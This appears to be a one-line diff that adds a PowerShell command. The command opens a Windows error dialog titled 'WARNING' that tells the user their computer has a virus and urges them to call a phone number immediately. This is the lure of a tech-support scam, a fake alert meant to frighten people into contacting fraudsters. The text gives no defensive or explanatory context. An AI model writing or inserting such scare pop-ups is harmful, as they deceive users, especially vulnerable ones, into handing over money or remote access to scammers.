@@ -1,0 +1,1 @@
+Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('Your computer has a virus. Please call 1-800-HACKED immediately.','WARNING',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
